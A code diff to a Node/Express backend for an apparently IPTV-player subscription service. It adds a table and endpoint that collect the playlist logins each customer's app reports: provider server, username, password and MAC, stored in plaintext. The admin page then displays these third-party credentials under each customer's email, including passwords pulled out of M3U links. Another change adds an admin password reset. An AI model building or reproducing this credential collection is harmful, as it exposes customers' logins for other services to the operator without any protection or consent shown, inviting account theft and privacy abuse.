@@ -68,6 +68,10 @@ CREATE TABLE IF NOT EXISTS orders (
   created INTEGER NOT NULL, decided INTEGER
 );
 CREATE TABLE IF NOT EXISTS revoked (user_id INTEGER NOT NULL, device_id TEXT NOT NULL, PRIMARY KEY (user_id, device_id));
+-- Playlist logins (IPTV lines) each signed-in app reports, shown to the admin under the customer's email.
+CREATE TABLE IF NOT EXISTS lines (
+  user_id INTEGER NOT NULL, device_id TEXT NOT NULL, name TEXT, type TEXT, server TEXT, username TEXT, password TEXT, mac TEXT, streams TEXT, updated INTEGER
+);
 CREATE TABLE IF NOT EXISTS payments (
   id INTEGER PRIMARY KEY AUTOINCREMENT, user_id INTEGER, plan TEXT, amount INTEGER, ref TEXT, created INTEGER
 );
@@ -333,10 +337,26 @@ app.get('/api/account', (req, res) => {
   res.json({ account: accountJson(a.user, a.token.device_id) });
 });
 
+// The app reports the playlist logins (IPTV lines) it uses, so the admin can see them under the customer.
+app.post('/api/lines', (req, res) => {
+  const a = authFromRequest(req);
+  if (!a || !a.token.device_id) return res.status(401).json({ error: 'Signed out. Please sign in again.' });
+  const list = Array.isArray(req.body?.lines) ? req.body.lines.slice(0, 20) : [];
+  const str = (v, n = 300) => String(v ?? '').slice(0, n);
+  db.prepare('DELETE FROM lines WHERE user_id = ? AND device_id = ?').run(a.user.id, a.token.device_id);
+  for (const l of list) {
+    const streams = (Array.isArray(l.streams) ? l.streams : []).slice(0, 5).map(h => str(h, 120)).join(',');
+    db.prepare('INSERT INTO lines (user_id, device_id, name, type, server, username, password, mac, streams, updated) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)')
+      .run(a.user.id, a.token.device_id, str(l.name, 80), str(l.type, 20), str(l.server, 500), str(l.username, 120), str(l.password, 120), str(l.mac, 40), streams, Date.now());
+  }
+  res.json({ ok: true });
+});
+
 app.post('/api/logout', (req, res) => {
   const a = authFromRequest(req);
   if (a) {
     if (a.token.device_id) db.prepare('DELETE FROM devices WHERE user_id = ? AND device_id = ?').run(a.user.id, a.token.device_id);
+    if (a.token.device_id) db.prepare('DELETE FROM lines WHERE user_id = ? AND device_id = ?').run(a.user.id, a.token.device_id);
     revoke(a.user.id, a.token.device_id);
     db.prepare('DELETE FROM tokens WHERE token = ?').run(a.token.token);
   }
@@ -361,6 +381,7 @@ function removeDevice(userId, deviceRowId) {
   if (!d) return;
   db.prepare('DELETE FROM tokens WHERE user_id = ? AND device_id = ?').run(userId, d.device_id);
   db.prepare('DELETE FROM devices WHERE id = ?').run(d.id);
+  db.prepare('DELETE FROM lines WHERE user_id = ? AND device_id = ?').run(userId, d.device_id);
   revoke(userId, d.device_id);
 }
 
@@ -380,6 +401,7 @@ table{width:100%;border-collapse:collapse;font-size:14px}td,th{padding:8px 6px;b
 .ok{color:#66bb6a}.warn{background:#3b2f00;color:#ffd54f;padding:10px 14px;border-radius:8px;margin-bottom:16px}
 .err{background:#3b0d0d;color:#ff8a80;padding:10px 14px;border-radius:8px;margin-bottom:16px}
 .row{display:flex;gap:10px;flex-wrap:wrap;align-items:center}form.inline{display:inline}
+.line{margin-top:8px;padding:10px 12px;background:#12151a;border-radius:8px;font-size:14px;line-height:1.8;overflow-wrap:anywhere;min-width:280px}.line .k{display:block;color:rgba(230,232,235,.6);font-size:12px;margin-top:4px}code{background:#23272f;padding:2px 6px;border-radius:4px;font-size:14px;overflow-wrap:anywhere}
 ul.features{margin:6px 0 0;padding-left:18px;color:rgba(230,232,235,.8);line-height:1.7}
 `;
 const esc = s => String(s ?? '').replace(/[&<>"']/g, c => ({ '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#39;' }[c]));
@@ -603,17 +625,33 @@ app.get('/admin', (req, res) => {
   const premiumCount = db.prepare('SELECT COUNT(*) n FROM users WHERE premium_until > ?').get(Date.now()).n;
   const revenue = db.prepare(`SELECT COALESCE(SUM(amount),0) s FROM payments WHERE ref != 'TEST'`).get().s;
   const p = prices();
+  const lineRows = db.prepare(`SELECT l.*, d.name AS device FROM lines l LEFT JOIN devices d ON d.user_id = l.user_id AND d.device_id = l.device_id ORDER BY l.updated DESC`).all();
+  const linesHtml = uid => {
+    const seen = new Set();
+    const mine = lineRows.filter(l => l.user_id === uid).filter(l => { const k = [l.server, l.username, l.password, l.mac].join('|'); if (seen.has(k)) return false; seen.add(k); return true; });
+    return mine.map(l => {
+      // Domain the playlist comes from; M3U links often carry the login in the link itself (get.php?username=…&password=…).
+      let domain = '', user = l.username, pass = l.password;
+      try { const u = new URL(/^[a-z]+:\/\//i.test(l.server) ? l.server : `http://${l.server}`); domain = u.origin;
+        user = user || u.searchParams.get('username') || ''; pass = pass || u.searchParams.get('password') || ''; } catch { /* not a link */ }
+      const streams = String(l.streams || '').split(',').filter(Boolean);
+      l = { ...l, username: user, password: pass };
+      return `<div class="line"><b>${esc(l.name || l.type || 'Playlist')}</b>${l.device ? ` <span class="muted">on ${esc(l.device)}</span>` : ''}
+      ${l.type ? `<span class="k">Type</span><code>${esc(l.type)}</code>` : ''}${domain ? `<span class="k">Domain</span><code>${esc(domain)}</code>` : ''}${streams.length ? `<span class="k">Streams from</span>${streams.map(h => `<code>${esc(h)}</code>`).join('<br>')}` : ''}${l.server ? `<span class="k">Full link</span>${esc(l.server)}` : ''}${l.username ? `<span class="k">Username</span><code>${esc(l.username)}</code>` : ''}${l.password ? `<span class="k">Password</span><code>${esc(l.password)}</code>` : ''}${l.mac ? `<span class="k">MAC</span><code>${esc(l.mac)}</code>` : ''}</div>`;
+    }).join('');
+  };
   const rows = users.map(u => {
     const devs = db.prepare('SELECT COUNT(*) n FROM devices WHERE user_id = ?').get(u.id).n;
     const st = isAdmin(u) ? '<span class="ok">Admin (always Premium)</span>' : isPremium(u)
       ? `<span class="ok">Premium</span> · ${esc(PLAN_LABEL[u.plan] || u.plan)}${u.premium_until >= LIFETIME ? '' : ` · until ${new Date(u.premium_until).toLocaleDateString()}`}`
       : '<span class="muted">Free</span>';
-    return `<tr><td>${esc(u.email)}<div class="muted">joined ${new Date(u.created).toLocaleDateString()}${u.note ? ' · ' + esc(u.note) : ''}</div></td><td>${st}</td><td>${devs}/${DEVICE_LIMIT}</td>
+    return `<tr><td>${esc(u.email)}<div class="muted">joined ${new Date(u.created).toLocaleDateString()}${u.note ? ' · ' + esc(u.note) : ''}</div>${linesHtml(u.id)}</td><td>${st}</td><td>${devs}/${DEVICE_LIMIT}</td>
       <td><form class="inline row" method="post" action="/admin/users/${u.id}/grant"><select name="days" style="width:auto;margin:0">
         <option value="31">+1 month</option><option value="93">+3 months</option><option value="366">+1 year</option><option value="lifetime">Lifetime</option></select>
         <button>Give Premium</button></form>
         ${!isAdmin(u) && isPremium(u) ? `<form class="inline" method="post" action="/admin/users/${u.id}/revoke"><button class="red">Remove Premium</button></form>` : ''}
-        <form class="inline" method="post" action="/admin/users/${u.id}/signout"><button class="gray">Sign out devices</button></form></td></tr>`;
+        <form class="inline" method="post" action="/admin/users/${u.id}/signout"><button class="gray">Sign out devices</button></form>
+        <form class="inline row" method="post" action="/admin/users/${u.id}/password" style="margin-top:6px"><input name="password" placeholder="new password" minlength="6" required style="width:150px;margin:0"><button class="gray">Set password</button></form></td></tr>`;
   }).join('');
   const pending = db.prepare(`SELECT o.*, u.email FROM orders o JOIN users u ON u.id = o.user_id WHERE o.status = 'pending' ORDER BY o.created`).all();
   const recent = db.prepare(`SELECT o.*, u.email FROM orders o JOIN users u ON u.id = o.user_id WHERE o.status != 'pending' ORDER BY o.decided DESC LIMIT 10`).all();
@@ -669,11 +707,23 @@ app.post('/admin/users/:id/revoke', (req, res) => {
   db.prepare(`UPDATE users SET plan = 'none', premium_until = 0 WHERE id = ? AND role != 'admin'`).run(+req.params.id);
   res.redirect('/admin');
 });
+// Customer forgot their password: the admin sets a new one and tells them (passwords can't be shown, they're stored scrambled).
+app.post('/admin/users/:id/password', (req, res) => {
+  const me = requireAdmin(req, res); if (!me) return;
+  const u = userById(+req.params.id);
+  const pw = String(req.body.password || '');
+  if (!u) return res.redirect('/admin');
+  if (pw.length < 6) return res.status(400).send(page('Admin', '<div class="err">Password must be at least 6 characters.</div><a href="/admin">Back</a>', me));
+  db.prepare('UPDATE users SET pass = ? WHERE id = ?').run(hashPassword(pw), u.id);
+  res.send(page('Admin', `<div class="card"><h3 style="margin-top:0">Password changed</h3><p>New password for <b>${esc(u.email)}</b>: <code>${esc(pw)}</code></p>
+    <p class="muted">Give it to the customer. Devices already signed in stay signed in.</p><a href="/admin">Back to admin</a></div>`, me));
+});
 app.post('/admin/users/:id/signout', (req, res) => {
   const me = requireAdmin(req, res); if (!me) return;
   for (const d of db.prepare('SELECT device_id FROM devices WHERE user_id = ?').all(+req.params.id)) revoke(+req.params.id, d.device_id);
   db.prepare('DELETE FROM tokens WHERE user_id = ? AND device_id IS NOT NULL').run(+req.params.id);
   db.prepare('DELETE FROM devices WHERE user_id = ?').run(+req.params.id);
+  db.prepare('DELETE FROM lines WHERE user_id = ?').run(+req.params.id);
   res.redirect('/admin');
 });
 app.post('/admin/orders/:id/approve', (req, res) => {
